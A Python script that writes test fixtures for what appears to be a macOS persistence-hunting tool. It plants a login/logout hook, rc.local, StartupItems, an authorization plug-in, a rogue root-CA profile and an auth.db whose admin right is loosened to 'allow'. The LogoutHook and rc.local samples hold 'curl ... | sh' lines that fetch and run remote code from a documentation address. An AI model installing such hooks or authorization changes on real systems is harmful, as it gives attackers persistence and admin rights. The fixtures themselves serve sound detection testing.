#!/usr/bin/env python3
"""Writes the planted macOS login-hook, authorization, StartupItems, rc.local, Folder Action,
plug-in and configuration-profile samples of the hunter's macOS tree. Example data only
(documentation addresses). Run: python3 generate_macos_extra.py"""
import datetime as dt, os, plistlib, sqlite3
root = os.path.join(os.path.dirname(os.path.abspath(__file__)), "macos")


def write(rel, data, mode="w"):
    path = os.path.join(root, rel)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, mode + ("b" if isinstance(data, bytes) else "")) as f:
        f.write(data)


def plist(rel, obj, fmt=plistlib.FMT_XML):
    write(rel, plistlib.dumps(obj, fmt=fmt))


plist("Library/Preferences/com.apple.loginwindow.plist", {
    "LoginHook": "/usr/local/bin/hook.sh",
    "LogoutHook": "/bin/sh -c 'curl -s http://198.51.100.1/a | sh'",
    "lastUserName": "alice"})
plist("Users/alice/Library/Preferences/ByHost/com.apple.loginwindow.00000000-0000-0000-0000-000000000000.plist", {
    "TALAppsToRelaunchAtLogin": [
        {"BundleID": "com.example.helper", "Path": "/Users/alice/Downloads/Helper.app", "BackgroundState": 2},
        {"BundleID": "com.apple.Safari", "Path": "/Applications/Safari.app", "BackgroundState": 2}]})
write("Library/StartupItems/Planted/Planted", "#!/bin/sh\n. /etc/rc.common\nRunService \"$1\"\n")
plist("Library/StartupItems/Planted/StartupParameters.plist", {"Description": "Planted", "Provides": ["Planted"]})
write("private/etc/rc.local", "#!/bin/sh\n# comment\n/usr/local/bin/startup.sh\ncurl -s http://198.51.100.1/p | sh\n")
write("Library/Scripts/Folder Action Scripts/watch.scpt", "#!/usr/bin/osascript\non adding folder items to this_folder after receiving added_items\nend adding folder items to\n")
plist("Library/Security/SecurityAgentPlugins/Planted.bundle/Contents/Info.plist",
      {"CFBundleIdentifier": "com.example.authplugin", "CFBundleName": "Planted", "CFBundleExecutable": "Planted"})
plist("private/var/db/ConfigurationProfiles/Store/ConfigProfiles.binary", {"_computerLevel": [{
    "ProfileIdentifier": "com.example.profile", "ProfileDisplayName": "Planted CA", "ProfileOrganization": "Example",
    "ProfileUUID": "AAAAAAAA-0000-0000-0000-000000000009", "ProfileInstallDate": dt.datetime(2023, 11, 1, 9, 0, 0),
    "ProfileItems": [{"PayloadType": "com.apple.security.root", "PayloadContent": b"not a real certificate"}]}]}, plistlib.FMT_BINARY)

# auth.db: the admin right changed from `user` to `allow`; other rules at their documented defaults.
path = os.path.join(root, "private/var/db/auth.db")
os.makedirs(os.path.dirname(path), exist_ok=True)
if os.path.exists(path):
    os.remove(path)
db = sqlite3.connect(path)
db.executescript("""
CREATE TABLE rules (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL UNIQUE, type INTEGER NOT NULL, class INTEGER, 'group' TEXT,
  kofn INTEGER, timeout INTEGER, flags INTEGER, tries INTEGER, version INTEGER NOT NULL DEFAULT 0, created REAL NOT NULL DEFAULT 0,
  modified REAL NOT NULL DEFAULT 0, hash BLOB, identifier TEXT, requirement BLOB, comment TEXT);
""")
db.execute("INSERT INTO rules (name,type,class,'group',created,modified) VALUES ('system.privilege.admin',1,4,NULL,700000000.0,700500000.0)")
db.execute("INSERT INTO rules (name,type,class,'group',created,modified) VALUES ('system.privilege.taskport',1,1,'admin',700000000.0,700000000.0)")
db.commit(); db.close()
